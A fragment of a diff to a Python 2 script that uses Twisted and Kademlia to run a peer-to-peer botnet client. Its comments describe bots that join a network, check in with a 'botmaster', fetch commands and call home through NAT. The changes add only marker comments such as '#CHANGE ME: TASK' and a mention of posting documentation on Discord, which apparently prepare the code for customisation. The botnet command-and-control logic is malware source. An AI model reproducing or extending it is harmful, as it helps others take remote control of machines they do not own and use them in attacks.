@@ -1,5 +1,5 @@
-from twisted.internet import reactor, task, defer
-from twisted.python import log
+from twisted.internet import reactor, task, defer #TWISTD
+from twisted.python import log #TWISTD
 from kademlia.network import Server
 from collections import Counter
 import subprocess, time, sys, hashlib, time
@@ -14,6 +14,9 @@ import subprocess, time, sys, hashlib, time
 # I'm using deferred chains due to the asynchronous aspects of the underlying P2P network.
 # Due to the design of the architecture, this should work through NAT as well. 
 
+# THE TWISTD DEFERRED FUNCTION APPEARS IN 2 LOCATIONS IN THIS PROJECT IT IS DOCUMENTED IN AUTHORS ORIGINAL COMMENTS, WILL POST DOCUMENTATION ON THIS IN DISCORD.
+
+#CHANGE ME: LOG
 log.startLogging(sys.stdout)
 
 if len(sys.argv) != 4:
@@ -105,6 +108,8 @@ def wait_cmd(server, bot):
 # This function is part of a deferred chain to check in with the botmaster after joining a network
 # It's never a direct connection to the master, and the bots dont know about other bots or the master.
 # They only know where to check in, and where to grab their commands from
+
+#CHANGE ME: TASK
 def ack_valid(value, server, bot):
     # t = hashlib.sha1().update('ack')
     if value != str(bot.id):
@@ -141,7 +146,7 @@ def setup(ip_list, server):
     bot = botnode(myip, port, str(server.node.long_id), idhash)
     callhome(server, bot)
 
-
+#CHANGE ME: REACTOR
 def bootstrapDone(found, server):
     if len(found) == 0:
         print "Could not connect to the bootstrap server."
